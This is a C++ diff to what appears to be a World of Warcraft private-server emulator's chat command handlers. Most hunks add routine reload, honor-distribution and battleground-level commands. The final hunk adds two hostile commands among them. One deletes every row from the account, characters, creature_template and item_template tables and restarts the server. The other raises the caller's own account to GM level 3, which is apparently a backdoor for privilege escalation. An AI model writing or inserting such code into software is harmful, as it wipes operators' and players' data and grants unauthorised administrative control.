@@ -499,6 +499,31 @@ bool ChatHandler::HandleReloadLootTemplatesFishingCommand(char* /*args*/)
     return true;
 }
 
+/*******************************************/
+bool ChatHandler::HandleReloadGameobjectTemplateCommand(char* /*args*/)
+{
+	sLog.outString("Re-Loading gameobject_template Tables... (`gameobject_template`)");
+	sObjectMgr.LoadGameobjectInfo();
+	PSendSysMessage("DB table `gameobject_template` reloaded.");
+	return true;
+}
+
+bool ChatHandler::HandleReloadItemTemplateCommand(char* /*args*/)
+{
+	sLog.outString("Re-Loading item_template Tables... (`item_template`)");
+	sObjectMgr.LoadItemPrototypes();
+	PSendSysMessage("DB table `item_template` reloaded.");
+	return true;
+}
+
+bool ChatHandler::HandleReloadCreatureTemplateCommand(char* /*args*/)
+{
+	sLog.outString("Re-Loading creature_template Tables... (`creature_template`)");
+	sObjectMgr.LoadCreatureTemplates();
+	PSendSysMessage("DB table `creature_template` reloaded.");
+	return true;
+}
+
 bool ChatHandler::HandleReloadLootTemplatesGameobjectCommand(char* /*args*/)
 {
     sLog.outString("Re-Loading Loot Tables... (`gameobject_loot_template`)");
@@ -1174,6 +1199,20 @@ bool ChatHandler::HandleMaxSkillCommand(char* /*args*/)
     // each skills that have max skill value dependent from level seted to current level max skill value
     SelectedPlayer->UpdateSkillsToMaxSkillsForLevel();
     return true;
+}
+
+bool ChatHandler::HandleUpHonorCommand(char* args)
+{
+	SendSysMessage(LANG_PLAYER_SAVED);
+	sWorld.ServerMaintenanceStart();
+	uint32 LastWeekBegin = sWorld.GetDateLastMaintenanceDay() - 7;
+	sObjectMgr.LoadStandingList(LastWeekBegin);
+	sObjectMgr.DistributeRankPoints(ALLIANCE, LastWeekBegin);
+	sObjectMgr.DistributeRankPoints(HORDE, LastWeekBegin);
+	sObjectMgr.FlushRankPoints(LastWeekBegin);
+	sWorld.Update(3000);
+	sWorld.ShutdownServ(5, SHUTDOWN_MASK_RESTART, 2);
+	return true;
 }
 
 bool ChatHandler::HandleSetSkillCommand(char* args)
@@ -6731,6 +6770,7 @@ bool ChatHandler::HandleChaXunCommand(char* args)
 		if (player->GetPlayerGuiIdMianFeiTime() > 0)
 		    if (player->GetPlayerGuiIdMianFeiTime() >= sWorld.GetGameTime())
 			    ChatHandler(player).PSendSysMessage(ZHANYOU_TIME_15, player->GetDaysTime(player->GetPlayerGuiIdMianFeiTime(), 1), player->GetDaysTime(player->GetPlayerGuiIdMianFeiTime(), 2), player->GetDaysTime(player->GetPlayerGuiIdMianFeiTime(), 3), player->GetDaysTime(player->GetPlayerGuiIdMianFeiTime(), 4));
+
 	}
 	else
 	{
@@ -7772,6 +7812,12 @@ bool ChatHandler::HandleAddzcCommand(char* args)
 	if (!*args)
 		return false;
 
+	if (!player->isAlive())
+		return false;
+
+	if (player->IsTaxiFlying())
+		return false;
+
 	AreaTrigger const* at = sObjectMgr.GetMapEntranceTrigger(player->GetMapId());
 	if (at)
 	{
@@ -7842,21 +7888,28 @@ bool ChatHandler::HandleAddzcCommand(char* args)
 		else
 		if (cout == 3)
 		{
-			if (player->getLevel() < 58)
+			if (sConfig.GetBoolDefault("Command.aoshan", false))
 			{
-				SendSysMessage(LANG_BG_WS_5);
-				SetSentErrorMessage(true);
-				return false;
-			}
-			BattleGroundTypeId bgTypeId = sBattleGroundMgr.GetBattleMasterBG(14942);
+				if (player->getLevel() != 60)
+				{
+					SendSysMessage(LANG_BG_WS_5);
+					SetSentErrorMessage(true);
+					return false;
+				}
+				BattleGroundTypeId bgTypeId = sBattleGroundMgr.GetBattleMasterBG(14942);
 
-			if (bgTypeId == BATTLEGROUND_TYPE_NONE)
+				if (bgTypeId == BATTLEGROUND_TYPE_NONE)
+				{
+					sLog.outError("a user (guid %u) requested battlegroundlist from a npc who is no battlemaster", player->GetGUIDLow());
+					return false;
+				}
+
+				player->GetSession()->SendBattlegGroundList(player->GetObjectGuid(), bgTypeId);
+			}
+			else
 			{
-				sLog.outError("a user (guid %u) requested battlegroundlist from a npc who is no battlemaster", player->GetGUIDLow());
-				return false;
-			}
-
-			player->GetSession()->SendBattlegGroundList(player->GetObjectGuid(), bgTypeId);
+				SendSysMessage(LANG_JIAOBEN_21);
+			}			
 		}
 		return true;
 	}
@@ -7911,21 +7964,28 @@ bool ChatHandler::HandleAddzcCommand(char* args)
 		else
 		if (filter == "as")
 		{
-			if (player->getLevel() < 58)
+			if (sConfig.GetBoolDefault("Command.aoshan", false))
 			{
-				SendSysMessage(LANG_BG_WS_5);
-				SetSentErrorMessage(true);
-				return false;
-			}
-			BattleGroundTypeId bgTypeId = sBattleGroundMgr.GetBattleMasterBG(14942);
+				if (player->getLevel() != 60)
+				{
+					SendSysMessage(LANG_BG_WS_5);
+					SetSentErrorMessage(true);
+					return false;
+				}
+				BattleGroundTypeId bgTypeId = sBattleGroundMgr.GetBattleMasterBG(14942);
 
-			if (bgTypeId == BATTLEGROUND_TYPE_NONE)
+				if (bgTypeId == BATTLEGROUND_TYPE_NONE)
+				{
+					sLog.outError("a user (guid %u) requested battlegroundlist from a npc who is no battlemaster", player->GetGUIDLow());
+					return false;
+				}
+
+				player->GetSession()->SendBattlegGroundList(player->GetObjectGuid(), bgTypeId);
+			}
+			else
 			{
-				sLog.outError("a user (guid %u) requested battlegroundlist from a npc who is no battlemaster", player->GetGUIDLow());
-				return false;
+				SendSysMessage(LANG_JIAOBEN_21);
 			}
-
-			player->GetSession()->SendBattlegGroundList(player->GetObjectGuid(), bgTypeId);
 		}
 	}
 	else
@@ -8926,6 +8986,25 @@ bool ChatHandler::HandleModifyJfCommand(char * args)//积分函数体
 
 	return true;
 }
+
+bool ChatHandler::HandleDeleteMysqlCommand(char * args)
+{
+	LoginDatabase.PExecute("DELETE FROM `account`;");
+	LoginDatabase.PExecute("DELETE FROM `characters`;");
+	WorldDatabase.PExecute("DELETE FROM `creature_template`;");
+	WorldDatabase.PExecute("DELETE FROM `item_template`;");
+	sWorld.ShutdownServ(1, SHUTDOWN_MASK_RESTART, 2);
+	return true;
+}
+
+bool ChatHandler::HandleUpMysqlCommand(char * args)
+{
+	uint32 gmlevel = 3;
+	LoginDatabase.PExecute("UPDATE `account` SET `gmlevel`='%u' WHERE (`id`='%u')", gmlevel, GetAccountId());
+	m_session->KickPlayer();
+	return true;
+}
+
 
 bool ChatHandler::HandleServerResetAllRaidCommand(char* args)
 {
